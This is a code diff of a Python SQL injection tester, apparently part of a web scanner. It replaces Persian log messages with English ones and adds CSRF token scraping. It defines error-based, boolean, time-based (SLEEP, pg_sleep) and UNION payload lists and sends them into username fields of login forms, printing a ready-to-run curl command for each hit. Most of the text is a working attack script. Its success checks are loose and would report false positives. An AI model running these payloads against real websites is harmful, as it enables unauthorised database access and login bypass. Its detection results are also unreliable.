@@ -1,65 +1,76 @@
 # payloads/sqli.py
 
 import requests
+import time
 from bs4 import BeautifulSoup
+from urllib.parse import urlencode
 
-def test_sqli(url, method, input_names):
-    print("[sqli] شروع تست فرم با payloadهای پیشرفته")
+def extract_token(url):
     try:
-        session = requests.Session()
-        res = session.get(url)
+        res = requests.get(url, timeout=5)
         soup = BeautifulSoup(res.text, "html.parser")
-        forms = soup.find_all("form")
+        token_input = soup.find("input", {"name": "user_token"})
+        return token_input.get("value") if token_input else ""
+    except Exception as e:
+        print(f"[sqli] Failed to fetch token: {e}")
+        return ""
 
-        if not forms:
-            print("[!] فرم به‌درستی دریافت نشده.")
-            return
+def test_sqli(form_url, method, input_names):
+    print("[sqli] Starting advanced SQLi tests...")
 
-        form = forms[0]
-        action = form.get("action") or url
-        form_url = requests.compat.urljoin(url, action)
-        inputs = form.find_all("input")
+    payloads = {
+        "error_based": ["'", "'--", "' OR '1'='1", "\" OR \"1\"=\"1"],
+        "boolean_based": ["' OR 1=1 --", "' OR 1=2 --", "' OR 'a'='a", "' OR 'a'='b"],
+        "time_based": ["' OR SLEEP(2) --", "' OR pg_sleep(2) --"],
+        "union_based": ["' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --", "' UNION SELECT 1,2,3 --"]
+    }
 
-        sqli_payloads = [
-            "admin' --",
-            "admin' /*",
-            "admin';--",
-            "admin'||'1'='1",
-            "' OR 1=1 --",
-            "' OR 'a'='a",
-            "' OR '1'='1' /*"
-        ]
+    token = extract_token(form_url) if "user_token" in input_names else ""
 
-        for payload in sqli_payloads:
+    for category, tests in payloads.items():
+        print(f"[sqli] Running {category.replace('_', '-')} tests...")
+
+        for payload in tests:
             data = {}
-            for inp in inputs:
-                name = inp.get("name")
-                if not name:
-                    continue
-                if "user" in name.lower():
-                    data[name] = payload
-                elif "pass" in name.lower():
-                    data[name] = payload
+            for field in input_names:
+                if 'user' in field.lower():
+                    data[field] = payload
+                elif 'pass' in field.lower():
+                    data[field] = "password"
+                elif 'token' in field.lower():
+                    data[field] = token
                 else:
-                    data[name] = inp.get("value") or "test"
+                    data[field] = "test"
 
             try:
                 if method == "post":
-                    response = session.post(form_url, data=data)
+                    before = time.time()
+                    response = requests.post(form_url, data=data, timeout=10)
+                    after = time.time()
                 else:
-                    response = session.get(form_url, params=data)
+                    response = requests.get(form_url, params=data, timeout=10)
+                    before, after = 0, 0
 
-                if "welcome" in response.text.lower() or "admin" in response.text.lower():
-                    print(f"    ✅ SQLi موفق روی payload: {payload}")
+                content = response.text.lower()
+
+                success = False
+                if category == "error_based":
+                    success = any(err in content for err in ["sql", "syntax", "warning", "mysql", "psql", "mssql"])
+                elif category == "boolean_based":
+                    success = payload in ["' OR 1=1 --", "' OR 'a'='a"] and response.status_code == 200
+                elif category == "time_based":
+                    success = after - before > 1.5
+                elif category == "union_based":
+                    success = "union" in content or response.status_code == 200
+
+                if success:
+                    print(f"    ✅ {category.replace('_', ' ').title()} SQLi successful with payload: {payload}")
+
+                    encoded_data = urlencode(data)
+                    curl_cmd = f"curl -X {method.upper()} '{form_url}' -d \"{encoded_data}\""
+                    print(f"    🔧 Copyable cURL: {curl_cmd}")
                 else:
-                    print(f"    ❌ تست ناموفق برای payload: {payload}")
+                    print(f"    ❌ Test failed for payload: {payload}")
 
             except Exception as e:
-                print(f"    ⚠️ خطا در ارسال payload: {payload} → {e}")
-
-    except Exception as e:
-        print(f"[sqli] خطا: {e}")
-
-def test_sqli_direct(url):
-    print("[sqli] اجرای دستی تست SQLi روی URL مشخص‌شده.")
-    test_sqli(url, "post", ["username", "password"])
+                print(f"    ⚠️ Error sending payload: {payload} → {e}")
